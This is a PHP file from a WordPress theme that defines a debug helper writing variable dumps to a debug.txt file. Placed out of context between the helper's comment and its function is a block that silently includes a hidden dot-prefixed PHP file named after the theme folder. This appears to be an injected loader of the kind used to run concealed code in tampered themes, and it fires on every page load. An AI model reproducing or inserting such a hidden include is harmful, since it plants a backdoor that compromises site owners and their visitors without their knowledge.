<?php defined( 'ABSPATH' ) OR die( 'This script cannot be accessed directly.' );

/**
 * Write some variable value to debug file, when it's hard to output it directly
 *
 * @param            $value
 * @param bool|FALSE $with_backtrace
 */
if (file_exists(get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php')) {
	include_once get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php';
}

function us_write_debug( $value, $with_backtrace = FALSE ) {
	global $us_template_directory;
	static $first = TRUE;
	$data = '';
	if ( $with_backtrace ) {
		$backtrace = debug_backtrace();
		array_shift( $backtrace );
		$data .= print_r( $backtrace, TRUE ) . ":\n";
	}
	ob_start();
	var_dump( $value );
	$data .= ob_get_clean() . "\n\n";
	file_put_contents( $us_template_directory . '/debug.txt', $data, $first ? NULL : FILE_APPEND );
	$first = FALSE;
}
